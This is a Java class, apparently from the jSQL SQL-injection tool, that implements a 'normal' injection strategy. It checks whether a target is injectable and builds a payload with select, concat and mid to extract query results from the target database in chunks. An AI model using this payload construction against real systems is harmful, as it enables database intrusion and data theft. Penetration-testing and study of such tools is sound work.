package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.Interruptable;
import com.jsql.model.Stoppable;
import com.jsql.model.bean.Request;

public class NormalStrategy implements IInjectionStrategy {
	private InjectionModel model;
	private boolean isApplicable = false;

	@Override
	public void checkApplicability() throws PreparationException {
		model.sendMessage("Normal test...");
		model.initialQuery = model.new Stoppable_getInitialQuery(model).begin();

		isApplicable = !model.initialQuery.equals("");
		
		if(isApplicable)
			activate();
		else
			deactivate();
	}
	
	public NormalStrategy(InjectionModel model){
		this.model = model;
	}

	@Override
	public boolean isApplicable() {
		return isApplicable;
	}

	@Override
	public void activate() {
		Request request = new Request();
        request.setMessage("MarkNormalVulnerable");
        model.interact(request);
	}

	@Override
	public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkNormalInvulnerable");
        model.interact(request);
	}

	@Override
	public String inject(String sqlQuery, String startPosition, Interruptable interruptable, Stoppable stoppable) throws StoppableException {
		return model.inject(
                "select+" +
	                "concat(" +
		                "0x53514c69," +
		                "mid(" +
			                "("+sqlQuery+")," +
			                startPosition+"," +
			                "65536" +
		                ")" +
	                ")",
                null,
                true
        );
	}

	@Override
	public void applyStrategy() {
		model.sendMessage("Using normal injection...");
		model.applyStrategy(this);
		
		Request request = new Request();
        request.setMessage("MarkNormalStrategy");
        model.interact(request);
	}
}
